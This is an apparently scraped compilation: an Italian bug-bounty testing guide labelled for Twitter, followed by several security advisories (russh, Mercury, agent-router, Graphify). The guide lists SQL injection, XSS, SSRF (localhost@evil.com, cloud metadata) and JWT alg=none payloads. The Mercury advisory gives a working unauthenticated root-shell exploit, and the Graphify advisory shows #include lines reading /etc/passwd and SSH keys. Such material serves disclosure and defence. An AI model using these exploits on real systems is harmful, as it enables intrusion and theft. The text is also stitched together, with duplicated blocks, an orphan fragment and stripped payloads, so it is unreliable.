titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

A remote attacker who can reach an enabled VNC TLS listener can cause the event-loop thread to spin at high CPU with no forward progress, resulting in denial of service.

titolo: GHSA-4wc5-f2rc-q74m: russh: Unbounded memory allocation in agent protocol server via crafted constraint records
descrizione:
### Summary

`russh_keys::agent::server::add_key` (`russh/src/keys/agent/server.rs:271-319`) spawns a dedicated tokio task for every 5-byte `SSH_AGENT_CONSTRAIN_LIFETIME` record attached to an added key, each cloning the key blob and sleeping for the declared lifetime (up to ~136 years). The loop has no per-request task budget, and spawned tasks are not rolled back when the overall request fails. Repeating one constrained add-key message over an agent connection converts wire bytes into resident tasks and heap at roughly 141x amplification: in our measurement 10.2 MiB of protocol traffic produced ~2,096,120 live tasks and +1,447,856 KiB RSS, while the same traffic sent as unconstrained add-key requests cost +268 KiB. An attacker reaching the agent socket (a local process, or a remote SSH server the user connects to with agent forwarding, since russh clients accept the `auth-agent@openssh.com` channel by default at `russh/src/client/mod.rs:2686`) can exhaust the agent process's memory and task capacity with a renewable, cheap request stream. Verified on russh HEAD efa9a03 (v0.63.3-10, 2026-10-01).


### Details

```rust
// russh/src/keys/agent/server.rs:271-319 (add_key, constraint loop)
while let Ok(t) = u8::decode(r) {
 match t {
 SSH_AGENT_CONSTRAIN_LIFETIME => {
 let lifetime = u32::decode(r)?;
 ...
 tokio::spawn({
 let key = key.clone;
 async move { tokio::time::sleep(...lifetime...).await; /* remove key */ }
 });
 }
 ...
```

Each lifetime record clones the key blob into a new task regardless of how many records the same request already spawned, and a failure later in the request leaves earlier tasks alive. Data flow: agent connection -> SSH_AGENTC_ADD_IDENTITY_CONSTRAINED -> constraint decode loop -> unbounded `tokio::spawn` per 5 bytes. The control measurement (identical wire volume as unconstrained adds) isolates the constraint path as the amplifier.

### Proof of concept

Prerequisites: Linux host with cargo and git. The archive's deploy script provisions russh at the pinned revision and the PoC crate (rewriting the path dependency); the PoC runs a real russh agent server on loopback and speaks the agent protocol to it.

```bash
$ POC_HOME=$HOME/russh-poc RUSSH_REPO=/home/ubuntu/HuntTargets/russh ./deployment/deploy.sh
russh at efa9a03 -> /home/ubuntu/russh-poc/poc

$ POC_HOME=$HOME/russh-poc ./poc/poc.sh 40
[*] round 29: reply code=6 RSS=1090272 KiB (delta +1087580 KiB)
[*] round 39: reply code=6 RSS=1450548 KiB (delta +1447856 KiB)
[*] final RSS = 1450548 KiB (delta +1447856 KiB, x141 amplification by wire bytes)
[*] ~2096120 tasks now sleep for ~136 years holding their blob + timer.
[*] fds = 19
```

The broker acks every request (code 6 = SUCCESS) while RSS grows to +1.45 GB from ~10 MiB of input. The harness's control mode (same wire volume, unconstrained adds) measured +268 KiB. The automated archive run reproduces exactly this trace.

#### Manual reproduction, step by step (no archive required)

1. Provision russh at the pinned revision and build the PoC crate (it hosts a real russh agent server in-process):

```bash
git clone https://github.com/Eugeny/russh && cd russh && git checkout efa9a03e541b69505d5e6ec0d9213d011c9f6310
cargo build --release   # in the PoC crate directory; the path dependency points at the clone
```

2. Run the PoC: it starts the agent on loopback, then sends repeated `SSH_AGENTC_ADD_IDENTITY_CONSTRAINED` messages whose constraint sections contain ~52,000 five-byte `SSH_AGENT_CONSTRAIN_LIFETIME` records each:

```bash
./target/release/poc-agent-addkey 40
# [*] round 29: reply code=6 RSS=1090272 KiB (delta +1087580 KiB)
# [*] round 39: reply code=6 RSS=1450548 KiB (delta +1447856 KiB)
# [*] final RSS = 1450548 KiB (delta +1447856 KiB, x141 amplification by wire bytes)
# [*] ~2096120 tasks now sleep for ~136 years holding their blob + timer.
```

3. Control: the same wire volume sent as UNCONSTRAINED add-key requests measures +268 KiB (`MODE=control`), isolating the constraint-record task spawn as the amplifier.

4. Reachability: any local process with access to the agent socket, or a remote SSH server the user connects to with agent forwarding (russh clients accept `auth-agent@openssh.com` channels by default, `russh/src/client/mod.rs:2686`), can drive this. Each spawned task clones the key blob and sleeps for the declared lifetime (up to ~136 years); tasks are never rolled back when a request fails.

### Impact

An attacker able to speak the agent protocol to a russh-based agent (local process on the socket, or a remote SSH server the user connects to with agent forwarding enabled) can drive gigabyte-scale memory growth and millions of leaked tasks per session with megabytes of traffic, renewable until the agent process is starved or OOM-killed, taking the user's SSH key agent down. The trust boundary is the agent protocol peer versus the agent process's resources. No confidentiality or integrity impact.

titolo: GHSA-2658-85cv-9wwq: Mercury: Stored / DOM Cross-Site Scripting (XSS): mr.Markdown renders untrusted content as raw, unsanitized HTML
descrizione:
## Summary Mercury turns Jupyter notebooks into shared web apps/dashboards. The `mr.Markdown` widget converts its input to HTML with **python-markdown and no sanitization step**. `MarkdownWidget` is an `ipywidgets.HTML` widget, whose value is written to the page as **raw HTML (via `innerHTML`) with no sanitization**, so the result reaches the DOM verbatim. When an app passes **untrusted data** (database rows, user submissions, uploaded file contents, or an external/LLM API response) to `mr.Markdown`, HTML/JS in that data executes in the browser of **whoever views the app** — a data-driven stored/DOM-based XSS. This is a library-provided rendering sink that fails to neutralize output; it is triggered by ordinary, reasonable application code, not by an author mistake. ## Root cause `mercury/md.py` — `MarkdownWidget._to_html()` (verified at v3.2.6, lines ~57–65): ```python def _to_html(self, text: str) -> str: if md_lib is not None: body = md_lib.markdown(text) # python-markdown: passes raw HTML through else: body = f"
{escape(text)}
" # escape() is ONLY the md-lib-absent fallback return self._apply_inline_theme(body) # regex styling — adds style=, removes nothing ``` Two neutralization failures compound: 1. **Markdown → HTML is unsanitized.** `python-markdown` passes raw HTML through by default: ``, `` therefore execute when the widget is displayed. **On the "sanitize" that exists:** `mercury_app/notebook_sanitize.py` (`sanitize_notebook_for_mercury_runtime`) and `packages/lab/src/mercury/save.ts` (`sanitizeMercuryNotebookContent`) strip *runtime metadata* and clear *code-cell saved outputs*. They do **not** neutralize HTML/JS, and they do not touch widget values or markdown source. "Sanitize" here is notebook hygiene, not XSS defense. ## Threat model (attacker → victim, not self-inflicted) The CVE-relevant framing is **data-driven**: the app author writes ordinary code, and the *data* is attacker-controlled. ```python import mercury as mr # `row` comes from a DB / user submission / uploaded file / external API — # i.e. NOT authored by the app developer: mr.Markdown(row["comment"]) ``` The attacker supplies the untrusted value (posts the comment, uploads the file, poisons the API/RAG source). A **different** user — another app user, a reviewer, an admin — then opens the app, and the payload executes in *their* browser. The vulnerable component (Mercury's server-side widget rendering) and the impacted component (the victim's browser session in the app origin) differ, which is the classic stored-XSS attacker/victim separation. **Amplifier — session sharing (`--keep-session`).** Mercury can serve one shared kernel session to all viewers (`mercury run … --keep-session`, README "Arguments": "share the same session between multiple users … others will see this"). It is **opt-in and defaults to off** (`keepSession=False` in `mercury_app/handlers.py`), so it is *not required* for the base case — any app that renders one user's untrusted data to another user is already vulnerable. When enabled, content one viewer submits is rendered into the session other viewers see, extending this to cross-user delivery. Authentication is **opt-in and off by default**: a free password gate exists (`mercury run … --pass=…`, README), while user-based authentication is a paid add-on. Because auth is off unless the operator enables it, unauthenticated public deployments — where the attacker needs no account — are a realistic default. ## Proof of Concept ```python import mercury as mr # Value that would realistically arrive from untrusted data (DB row, form field, # uploaded file, API/LLM response): untrusted = '' mr.Markdown(untrusted) # rendered to raw HTML, unsanitized, into the app DOM ``` The generated widget HTML contains the payload verbatim; when the widget is displayed, the `onerror` handler runs. ### What was confirmed (and how) - **Confirmed by execution in a real browser (sink level):** driving the *actual `python-markdown` output* into the same `ipywidgets.HTML` `value` sink the widget uses causes the payload to execute in headless Chromium. Execution was captured via Playwright's `dialog` event (which fires only on a genuine `alert()`, so the mere presence of the string in the HTML cannot cause a false positive). A benign control (`**hello**`) produced **zero** dialogs, confirming the harness reports only real execution. `python-markdown` passes `` through verbatim by default (behavior is not version-specific). - **Reasoned from source (not executed end-to-end):** the full path from a `mr.Markdown(...)` call in a *served Mercury app* to a viewer's DOM was not run end-to-end, because no isolated container/VM was available in the reporting environment. Because `MarkdownWidget` *is* the `ipywidgets.HTML` sink above and Mercury's frontend applies no sanitizer to widget HTML values (the only frontend sanitizer strips notebook metadata at save time), the served-app path is expected to behave identically. Reproduce end-to-end before publishing if you want the advisory to state full-path browser confirmation. ## Impact Mercury shares notebooks as web apps/dashboards, often for non-technical audiences. When an app renders untrusted data through `mr.Markdown`, the generated page carries attacker-controlled script that runs in the browser of any other viewer, in the app origin — enabling session/cookie/token theft, UI spoofing and forced actions as the victim, and pivoting within the hosting origin. With `--keep-session`, this extends to cross-user delivery within a shared session. ## Severity rationale (CVSS 3.1 per-metric) Base score reflects the realistic default: an unauthenticated deployment whose app renders untrusted data via `mr.Markdown`. | Metric | Value | Reason | |---|---|---| | **AV** Attack Vector | **Network (N)** | App is served over HTTP to remote users. | | **AC** Attack Complexity | **Low (L)** | No special conditions or race; supply data that reaches an `mr.Markdown` call. | | **PR** Privileges Required | **None (N)** | Baseline: the injection channel (public form/upload/API) needs no account; auth is optional/paid. See variant below. | | **UI** User Interaction | **Required (R)** | A victim must open/view the app page for the stored payload to run. | | **S** Scope | **Changed (C)** | The vulnerable component (server-side widget render) injects script that executes in a different security authority — the victim's browser session/origin. (This is the canonical XSS scoping in the CVSS 3.1 spec.) | | **C** Confidentiality | **Low (L)** | Script can read data/session material available to the app origin; scored L (not H) for a generic app without asserting full account takeover. | | **I** Integrity | **Low (L)** | Script can alter the page and act as the victim within the app; scored L generically. | | **A** Availability | **None (N)** | No direct availability impact. | Result: **`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = 6.1 (Medium)**. Deployment-dependent variants (state your environment's when filing): - Injection channel requires an authenticated low-privilege user → **PR:L** → `…/PR:L/UI:R/S:C/C:L/I:L/A:N` = **5.4**. - App origin exposes high-value auth material such that XSS yields full session/account takeover → **C:H/I:H** raises the score; justify per deployment rather than claiming it universally. ## Remediation Primary — **sanitize by default in `mr.Markdown`, with an explicit opt-out for the deliberate raw-HTML use case** (backward-compatible, non-breaking): ```python # mercury/md.py def _to_html(self, text: str, unsafe_allow_html: bool = False) -> str: if md_lib is not None: body = md_lib.markdown(text) else: body = f"
{escape(text)}
" if not unsafe_allow_html: # allowlist tags/attributes; strip javascript:/data: schemes and event handlers body = nh3.clean(body) # or bleach.clean(..., strip=True) return self._apply_inline_theme(body) ``` Expose `unsafe_allow_html=False` on `mr.Markdown(...)` so authors who deliberately embed trusted raw HTML can opt in, while the default is safe. This mirrors the convention used by comparable tools (e.g. Streamlit's `unsafe_allow_html`). Defense-in-depth: since widget HTML values are written via `innerHTML` without sanitization, consider sanitizing widget HTML values at the frontend before they reach the DOM, and/or serving a Content-Security-Policy that forbids inline event handlers, so a single missed sink is not immediately exploitable. ## Additional hardening (secondary — not the reported vulnerability) Several widget ESMs write the **label** with `innerHTML`, e.g. `mercury/text.py` `topLabel.innerHTML = model.get("label") || …` (same shape in `number.py`, `time.py`, `date`/`datetime`/`daterange`/`select`/`json`/`file`, and `indicator.py`'s `_card_html`). **This is not an attacker→victim XSS path**: labels are static strings set by the app author in Python; URL/`url_params` overrides affect only widget `value` (assigned via the safe `input.value` property), never `label`, so there is no end-user/URL route into a label. It is a defense-in-depth / author footgun only. Recommended regardless: render UI strings with `textContent`, or `html.escape` labels, so output encoding is applied uniformly.

titolo: GHSA-f8c7-rwf9-fmgm: Mercury: Unauthenticated Remote Code Execution in /api/terminals - access control bypass
descrizione:
### Summary
A missing comma in `mercury_app/block_handler.py`'s `BLOCKED_PATTERNS` list causes the blocklist to fail to cover the `/api/terminals` endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.

### Details
The blocklist in `mercury_app/block_handler.py` is defined as:
```
BLOCKED_PATTERNS = [
    # JupyterLab UI + API
    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?"
    r"/api/terminals(?:/.*)?",
    r"/api/shutdown(?:/.*)?",
    r"/files(?:/.*)?",
]
```
The missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:

/lab...(?:/.`*`)?/api/terminals(?:/.`*`)? (the first two lines joined together)
/api/shutdown(?:/.`*`)?
/files(?:/.`*`)?

A direct request to `/api/terminals` does not match any of the 3 blocklist rules and is therefore **not blocked**, reaching Jupyter
Server's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.

### PoC
Testing was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, default
configuration.
 
**Step 1 - spawn a terminal:**


```
curl -i -X POST http://localhost:8888/api/terminals
```
Response: `{"name": "1", "last_activity": "..."}`

**Step 2 - connect to the terminal and execute commands:**


```
python3 -c "
import websocket, json, time

ws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')
print(ws.recv())

ws.send(json.dumps(['stdin', 'whoami && id\n']))
time.sleep(1)

ws.settimeout(2)
try:
    while True:
        print(ws.recv())
except Exception:
    pass
"
```


Observed output:

```
["setup", {}]
["stdout", "# "]
["stdout", "whoami && id\r\n"]
["stdout", "root\r\n"]
["stdout", "uid=0(root) gid=0(root) groups=0(root)\r\n# "]
```


Confirms full, interactive root shell access with no authentication or prior access of any kind.


### Impact
- **Confidentiality:** full read access to any file the Mercury process can access (notebooks, uploaded data, environment variables, secrets).
- **Integrity:** attacker can modify or delete any file, including notebooks served to other users.
- **Availability:** attacker can shut down or crash the server/container.
- **Lateral movement:** the shell can be used as a foothold to attack other systems reachable from the host's network.

Exploitable by any network client that can reach the Mercury server, including the public internet if it is deployed without additional access controls (VPN, reverse-proxy authentication, firewall).

### Fix
Add the missing comma so `/api/terminals` becomes an independent blocklist rule:
```
BLOCKED_PATTERNS = [
    # JupyterLab UI + API
    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?",
    r"/api/terminals(?:/.*)?",
    r"/api/shutdown(?:/.*)?",
    r"/files(?:/.*)?",
]
```

titolo: GHSA-953h-535j-jg2v: agent-router: MCP session resume does not verify the embedded anti-hijacking subject; default Helm seed makes session IDs forgeable
descrizione:
## Summary

The MCP proxy's client-facing session ID embeds the authenticated caller's
subject (JWT `sub` claim) specifically as an anti-hijacking discriminator —
matching the Model Context Protocol specification's documented session-hijacking
guidance (https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices#session-hijacking).
However, the session-resume path never checks that discriminator against the
current caller's identity, so any client that obtains a session ID (its own or
another user's) can resume that session and act with it — including on
routes with per-user backend sessions. This is aggravated by the official
Helm chart shipping a literal, publicly known default seed
(`"default-insecure-seed"`) for the key that encrypts these session IDs.

## Impact

An attacker who obtains (or, under the default seed, forges) another user's
`Mcp-Session-Id` value can resume that user's MCP session against the backend
MCP server(s) bound to the route — reading conversation/tool-call state and
invoking further JSON-RPC methods (e.g. `tools/call`, `resources/read`) in the
context of that other user's already-initialized backend session. On a
multi-tenant AI Gateway deployment, this crosses the exact trust boundary the
subject-embedding was added to protect.

## Location

- `internal/mcpproxy/session.go` — `clientToGatewaySessionID.backendSessionIDs()`
  (around line 707-765): parses `{routeName}@{subject}@{backends}` and returns
  only `(perBackendSessionIDs, route, error)`. The comment at the subject-parsing
  site reads: "The subject ... is retained inside the encrypted session ID for
  anti-hijacking purposes but is not needed during parsing." — the subject is
  discarded, never returned, never compared.
- `internal/mcpproxy/mcpproxy.go` — `sessionFromID(id, lastEvent)` (around line
  282-323): resumes a session purely from the decrypted blob; it is never passed
  the current request's authenticated subject, so there is nothing to compare
  against even if `backendSessionIDs()` did return it.
- `internal/mcpproxy/legacy.go` — `extractSubject(r)` (around line 1549-1562) is
  called exactly once, only at session creation (`handleInitializeRequest` ->
  `newSession`, line ~307/484/491) to embed the subject when the session ID is
  minted. All three session-resume call sites (`serveGET`/`servePOST`/`serverDELETE`
  paths, lines ~133, 167, 216) call `sessionFromID` with no subject argument at all.
- `internal/mcpproxy/mcpproxy.go` line 259 (`clientToGatewaySessionIDFromEntries`)
  is where the subject is embedded at creation, confirming the intended design.
- Aggravating factor: `manifests/charts/ai-gateway-helm/values.yaml` line 297
  ships `seed: "default-insecure-seed"` as the out-of-the-box value for
  `controller.mcp.sessionEncryption.seed`, which `templates/deployment.yaml`
  passes straight to `--mcpSessionEncryptionSeed` (also literally defaulted to
  `"default-insecure-seed"` in `cmd/controller/main.go` and
  `cmd/extproc/mainlib/main.go` when the flag is omitted entirely). Session IDs
  are `salt || nonce || ciphertext` (see `internal/mcpproxy/crypto.go`), so
  knowing the seed and the (also-defaulted) PBKDF2 iteration count is sufficient
  to derive the AES-GCM key and both decrypt observed session IDs and encrypt
  new ones for an arbitrary chosen subject/backend-session combination.

## Reproduction (code-level, not run against a live cluster)

1. Deploy Envoy AI Gateway with an `MCPRoute` that has an OAuth/JWT
   `SecurityPolicy` attached (so `internalapi.MCPSubjectHeader` is populated)
   and at least one backend MCP server, using the Helm chart's default
   `values.yaml` (`controller.mcp.sessionEncryption.seed` left at
   `"default-insecure-seed"`).
2. User A authenticates with a valid JWT (`sub: user-a`) and sends an
   `initialize` JSON-RPC request to the route. The gateway creates backend
   session(s) and returns `Mcp-Session-Id: <encrypted-blob-A>`, whose plaintext
   is `{route}@user-a@{backend}:{base64(sessionID)}:{capHex}`.
3. Attacker (any other authenticated user, or — since the seed is public and
   default — even without ever having a legitimate session at all) constructs
   `{route}@user-a@{backend}:{base64(<any-or-known-backend-session-id>)}:fff`,
   derives the AES-GCM key via PBKDF2(sha256, "default-insecure-seed",
   salt, 100000, 32) for a salt of their choosing, and encrypts it themselves
   to produce a session ID that decrypts to the same structure `sessionFromID`
   expects.
4. Attacker sends a subsequent JSON-RPC request (e.g. `tools/call`) to the same
   route with header `Mcp-Session-Id: <forged-or-captured-blob-A>`. The gateway
   decrypts it, extracts `perBackendSessionIDs` for `backend`, and forwards the
   attacker's call using that backend session — with no comparison to the
   attacker's own JWT subject at any point in `sessionFromID` /
   `backendSessionIDs()`.

## Suggested fix

- In `sessionFromID`, thread the current request's `extractSubject(r)` value
  through to `backendSessionIDs()` (or a wrapping call) and reject resumption
  (401/403) when the decrypted subject does not match the current caller's
  subject — restoring the anti-hijacking check the embedding was built for.
- Independently, change the Helm chart's default
  `controller.mcp.sessionEncryption.seed` to be randomly generated per
  install (e.g. via a Helm `lookup`/`randAlphaNum` in a pre-install hook, or a
  required value with no default), rather than shipping a literal, fixed
  string. At minimum, fail startup (rather than just logging) when the seed
  equals the documented insecure default in a non-dev/insecure-allowed mode.

## Detected by

Aeon vuln-scanner — agentic dataflow review (`internal/mcpproxy` entrypoint,
Envoy AI Gateway data-plane MCP proxy), followed by manual adversarial
verification against the exact HEAD commit of `main`
(`472da7db7984f769c9a77671d12c0354e75fc3ba`, confirmed to match
`repos/theagentrouter/agent-router/commits/main` at time of report).
Dependency-CVE findings from this scan (osv-scanner, `go.mod`/`package-lock.json`)
are not included here — they are all already covered by open Dependabot PRs
(#2555, #2643, #2672, #2497, #2615) and are omitted to avoid duplicate filings.

titolo: GHSA-pcc4-rvhr-2pr8: Graphify Fortran extractor: incomplete cpp #include hardening allows arbitrary host-file read/exfiltration when indexing an untrusted repo
descrizione:
## Summary

The Fortran extractor's C-preprocessor step (`graphify/extractors/fortran.py`, `_cpp_preprocess`) applies an incomplete `#include` hardening. The `-nostdinc -I /dev/null` flags it relies on (comment "Security (F-007)") do **not** stop a capital-`F` Fortran source file from including **absolute paths** (`#include "/etc/passwd"`) or from **path-traversing out of the corpus** (`#include "../../../../home/victim/.ssh/id_rsa"`). `cpp` always searches the directory of the file being preprocessed for quoted includes and always honours absolute include paths, regardless of `-nostdinc`/`-I`. As a result, indexing an untrusted repository that contains a `.F`/`.F90`/`.F95`/`.F03`/`.F08` file reads arbitrary local files off the host and inlines their contents into the knowledge graph, which is then shipped to the LLM/agent and written to the on-disk, shareable output (`graph.json`, `GRAPH_REPORT.md`, the Obsidian wiki, HTML/SVG exports).

This is the exact "corpus-side file-exfiltration vector" the F-007 comment says it is defending against; the mitigation is bypassable.

## Severity

High. Arbitrary local-file read on the host, triggered by graphify's core action (indexing an untrusted folder — "turn any folder of code ... into a queryable knowledge graph"), defeating a documented security control. It runs on the default, offline, no-API-key AST path (`graphify update .` / `graphify extract`) — no credentials, network, or LLM call required. CWE-73 (external control of file name/path) / CWE-22 (path traversal) / CWE-200 (information exposure).

## Where

`graphify/extractors/fortran.py`, `_cpp_preprocess()`:

    result = subprocess.run(
        ["cpp", "-w", "-P", "-nostdinc", "-I", "/dev/null", str(path.resolve())],
        capture_output=True, timeout=30,
    )

Reached from `extract_fortran()` (same file) for any suffix in `_FORTRAN_CPP_EXTS = {".F", ".F90", ".F95", ".F03", ".F08"}`, which are collected by default (`detect.CODE_EXTENSIONS`) and dispatched by `extract._DISPATCH`.

## Why the mitigation does not work

`-nostdinc` only removes the standard *system* include directories, and `-I /dev/null` only sets the *additional* search path. Neither affects:

1. Absolute includes — `#include "/etc/passwd"` is opened directly by cpp.
2. Quoted includes relative to the current file — cpp always searches the directory containing the file being preprocessed for `#include "..."`, so `#include "../../../../etc/shadow"` traverses out of the corpus.

## Proof of concept (verified)

Reproduced against the shipped code with the exact command `_cpp_preprocess` builds (`cpp -w -P -nostdinc -I /dev/null <file>`), and against `extract_fortran()` directly.

Secret on disk (`/tmp/secret.txt`): `TOP_SECRET_...`

(a) Absolute include — `evil_abs.F90`:

    program evil
    #include "/absolute/path/to/secret.txt"
    end program evil

(b) Relative traversal — `evil_rel.F90`:

    program evil
    #include "../secret.txt"
    end program evil

Both produce preprocessed output containing the full secret file contents (`"SECRET IN OUTPUT: True"` for both).

